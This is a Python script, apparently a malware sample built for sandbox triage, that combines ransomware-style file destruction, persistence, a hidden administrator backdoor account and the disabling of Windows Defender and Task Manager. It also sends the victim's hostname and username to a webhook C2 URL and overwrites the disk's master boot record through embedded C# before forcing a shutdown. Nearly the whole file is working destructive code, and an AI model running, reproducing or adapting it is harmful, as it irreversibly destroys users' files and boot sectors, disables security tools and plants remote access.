import os
import sys
import time
import ctypes
import random
import string
import threading
import subprocess
import tkinter as tk
from tkinter import font
import urllib.request
import urllib.parse
import base64

# ==========================================
# ЧАСТЬ 1: НАСТРОЙКИ И ПРОВЕРКА ПРАВ
# ==========================================

VICTIM_ID = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
C2_URL = "https://webhook.site/#!/5b8a4b2c-1f0e-4d6a-9b0e-7c8d9e0f1a2b"  # Фейковый C2 для Triage

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ==========================================
# ЧАСТЬ 2: ПЕРСИСТЕНТНОСТЬ (PERSISTENCE)
# ==========================================

def establish_persistence():
    # Добавляем в реестр автозагрузки
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WirdolUltimate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

    # Копируем в Temp
    try:
        temp_dir = os.getenv("TEMP")
        new_path = os.path.join(temp_dir, "svchost_update.exe")
        if sys.executable != new_path:
            import shutil
            shutil.copy2(sys.executable, new_path)
    except:
        pass

# ==========================================
# ЧАСТЬ 3: БЭКДОР (BACKDOOR)
# ==========================================

def create_backdoor():
    # Создаем скрытого пользователя
    user_cmd = 'net user wirdol_admin P@ssw0rd123! /add'
    admin_cmd = 'net localgroup Administrators wirdol_admin /add'
    
    subprocess.run(user_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(admin_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==========================================
# ЧАСТЬ 4: ОБХОД ЗАЩИТЫ (DEFENSE EVASION)
# ==========================================

def bypass_defense():
    # Отключаем Защитник
    ps_cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true'
    subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Отключаем Task Manager
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

# ==========================================
# ЧАСТЬ 5: ШИФРОВАНИЕ ФАЙЛОВ (RANSOMWARE)
# ==========================================

def encrypt_files():
    target_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads")
    ]
    
    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Читаем файл
                    with open(file_path, "rb") as f:
                        data = f.read()
                    
                    # "Шифруем" (Base64)
                    encoded = base64.b64encode(data)
                    
                    # Перезаписываем мусором (имитация)
                    with open(file_path, "wb") as f:
                        f.write(b"ENCRYPTED_BY_WIRDOL_" + encoded[:100])
                    
                    # Переименовываем
                    new_path = file_path + ".WIRDOL_LOCKED"
                    os.rename(file_path, new_path)
                except:
                    pass

    # Оставляем записку
    note_path = os.path.expanduser("~\\Desktop\\README_WIRDOL.txt")
    try:
        with open(note_path, "w") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED.\n")
            note.write("SEND 1 BTC TO: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
            note.write("YOUR ID: " + VICTIM_ID)
    except:
        pass

# ==========================================
# ЧАСТЬ 6: СЕТЕВАЯ АКТИВНОСТЬ (C2 / EXFILTRATION)
# ==========================================

def send_c2_ping():
    data = {
        "victim_id": VICTIM_ID,
        "hostname": os.getenv("COMPUTERNAME"),
        "username": os.getenv("USERNAME"),
        "os": "Windows 10/11",
        "status": "COMPROMISED"
    }
    
    try:
        encoded_data = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(C2_URL, data=encoded_data)
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# ==========================================
# ЧАСТЬ 7: ВИЗУАЛЬНЫЙ ЭКРАН (BLUETOOTH DESTROYER)
# ==========================================

def show_visual_payload():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="#0033A0")  # Синий Bluetooth
    root.overrideredirect(True)
    
    huge_font = font.Font(family="Segoe UI", size=40, weight="bold")
    
    label = tk.Label(root, text="I AM BLUETOOTH\nI AM DESTROYED YOUR PC", 
                     font=huge_font, fg="White", bg="#0033A0", justify="center")
    label.place(relx=0.5, rely=0.5, anchor="center")
    
    root.after(5000, root.destroy)  # Закрыть через 5 секунд
    root.mainloop()

# ==========================================
# ЧАСТЬ 8: УНИЧТОЖЕНИЕ СИСТЕМЫ (MBR KILLER)
# ==========================================

def destroy_mbr():
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        # Компилируем и выполняем код на C# через PowerShell (вшиваем в PS)
        ps_script = f"""
Add-Type -TypeDefinition @'
{mbr_code}
'@
[MBR]::Destroy()
"""
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # Запускаем в фоне всё, что можно
    threading.Thread(target=establish_persistence, daemon=True).start()
    threading.Thread(target=create_backdoor, daemon=True).start()
    threading.Thread(target=bypass_defense, daemon=True).start()
    threading.Thread(target=send_c2_ping, daemon=True).start()
    
    # Шифруем файлы (занимает время)
    encrypt_files()
    
    # Ломаем MBR
    destroy_mbr()
    
    # Показываем экран
    show_visual_payload()
    
    # Вырубаем систему
    os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    main()
